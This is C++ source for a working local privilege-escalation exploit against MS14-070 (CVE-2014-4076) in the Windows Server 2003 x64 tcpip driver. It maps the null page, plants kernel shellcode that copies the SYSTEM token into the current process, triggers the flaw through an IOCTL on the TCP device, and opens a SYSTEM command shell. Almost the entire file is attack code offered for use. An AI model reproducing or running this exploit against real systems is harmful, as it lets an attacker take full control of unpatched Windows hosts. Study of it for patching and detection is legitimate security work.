// ms14-070.cpp : Defines the entry point for the console application.
// MS14-070: https://technet.microsoft.com/library/security/ms14-070
// Original Exploit: http://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev
// Tested On: Windows Server 2003 R2 x64
// Author: Darren Kemp

#include "stdafx.h"
#include <Windows.h>

typedef void (WINAPI *DeviceIoControlFile)(HANDLE,HANDLE,PVOID,PVOID,PVOID,ULONG,PVOID,ULONG,PVOID,ULONG);
typedef NTSTATUS (WINAPI *AllocateVirtualMemory) (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);

#define INFO_CLASS_PROTOCOL			0x200;
#define INFO_TYPE_ADDRESS_OBJECT	0x200;
#define AO_OPTION_WINDOW			0x22;

typedef struct TDIEntityID {
	unsigned long tei_entity;
	unsigned long tei_instance;
} TDIEntityID;

typedef struct TDIObjectID {
	TDIEntityID toi_entity;
	unsigned long toi_class;
	unsigned long toi_type;
	unsigned long toi_id;
} TDIObjectID;

typedef struct tcp_request_set_information_ex {
	TDIObjectID ID;
	unsigned int BufferSize;
	unsigned char Buffer[1];
} TCP_REQUEST_SET_INFORMATION_EX, *PTCP_REQUEST_SET_INFORMATION_EX;

//Shellcode is a quick 64 bit port of https://www.exploit-db.com/exploits/17902
BYTE payload[] = 
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"	//mov rax,[gs:0x188]
	"\x48\x8b\x40\x68"						//mov rax,[rax+0x68]
	"\x48\xc7\xc3\x04\x00\x00\x00"			//mov rbx,4
	"\x50"									//push rax
	"\x48\x8b\x80\xe0\x00\x00\x00"			//mov rax,[rax+0xe0]
	"\x48\x2d\xe0\x00\x00\x00"				//sub rax,0xe0
	"\x39\x98\xd8\x00\x00\x00"				//cmp [rax+0xd8],ebx
	"\x75\xeb"								//jne 15
	"\x8b\xb8\x60\x01\x00\x00"				//mov edi,[rax+0x160]
	"\x81\xe7\xf8\xff\xff\x0f"				//and edi,0x0ffffff8
	"\x58"									//pop rax
	"\x48\xc7\xc3\x00\x00\x00\x00"			//mov rbx,0xb80
	"\x48\x8b\x80\xe0\x00\x00\x00"			//mov rax,[rax+0xe0]
	"\x48\x2d\xe0\x00\x00\x00"				//sub rax,0xe0
	"\x39\x98\xd8\x00\x00\x00"				//cmp [rax+0xd8],ebx
	"\x75\xeb"								//jne 3e
	"\x89\xb8\x60\x01\x00\x00"				//mov [rax+0x160],edi
	"\xc3";									//ret

void patch_payload(DWORD pid) {
	payload[58] = (BYTE)(DWORD) pid & 0x000000ff;
	payload[59] = (BYTE)(((DWORD) pid & 0x0000ff00) >> 8);
	payload[60] = (BYTE)(((DWORD) pid & 0x00ff0000) >> 16);
	payload[61] = (BYTE)(((DWORD) pid & 0xff000000) >> 24);
}

int trigger() {
	TCP_REQUEST_SET_INFORMATION_EX buf;
	memset(&buf, 0, sizeof(buf));

	buf.ID.toi_entity.tei_entity = 0x400;
	buf.ID.toi_entity.tei_instance = 0;
	buf.ID.toi_class = INFO_CLASS_PROTOCOL;
	buf.ID.toi_type = INFO_TYPE_ADDRESS_OBJECT;
	buf.ID.toi_id = AO_OPTION_WINDOW;
	buf.BufferSize = 4;

	DeviceIoControlFile pDeviceIoControlFile = (DeviceIoControlFile) GetProcAddress(GetModuleHandle(TEXT("ntdll.dll" )),"ZwDeviceIoControlFile");

	if (!pDeviceIoControlFile) {
		printf("[-] Failed to resolve ZwDeviceIoControlFile.\n" );
        return -1;
    }

	HANDLE hTCP = CreateFileA("\\\\.\\Tcp" ,FILE_SHARE_WRITE|FILE_SHARE_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if (!hTCP) {
		printf( "[-] Failed to open TCP device.\n" );
        return -1;
    }

	printf("[+] Triggering vulnerability.\n");
	pDeviceIoControlFile(hTCP,NULL,NULL,NULL,&buf,0x00120028,&buf,sizeof(buf),0,0);

	printf("[+] Dropping you to a shell.\n");
	system("cmd.exe");

	return 0;
}

int _tmain(int argc, _TCHAR* argv[]) {
	UINT magic =	0x00001397; //This value will get us through a few branches we need to get to an exploitable path
	ULONG target =	0x1f00;
	
	SIZE_T null_page_size = 0x1000;
	SIZE_T sc_size =		0xFF;

	PVOID null_page =	(PVOID) 1;
	PVOID sc =			(PVOID) 0x1f00;	
	PVOID offset =		(PVOID) 0x50;   //Pass a check to take a branch we need
	PVOID offset_ptr =	(PVOID) 0x190;  //Location of the function pointer we hijack

	printf("CVE-2014-4076 / MS14-070\n");

    AllocateVirtualMemory pAllocateVirtualMemory = (AllocateVirtualMemory) GetProcAddress(GetModuleHandle(TEXT("ntdll.dll" )),"ZwAllocateVirtualMemory");

	if (!pAllocateVirtualMemory) {
		printf("[-] Failed to resolve ZwAllocateVirtualMemory.");
	}
	
	DWORD pid = (DWORD) GetCurrentProcessId();
	printf("[+] Will attempt to elevate PID %u.\n", pid);

	patch_payload(pid);

	printf("[+] Mapping null page.\n");
    pAllocateVirtualMemory((HANDLE)-1, &null_page, 0, &null_page_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	printf("[+] Mapping payload at %p.\n", sc);
	pAllocateVirtualMemory((HANDLE)-1, &sc, 0, &sc_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memset(null_page,0,null_page_size);
	memset(sc,0xcc,sc_size);

	memcpy(offset_ptr,&target,sizeof(target));
	memcpy(offset,&magic,sizeof(magic));
	memcpy(sc,payload,sizeof(payload)-1);

	return trigger();
}
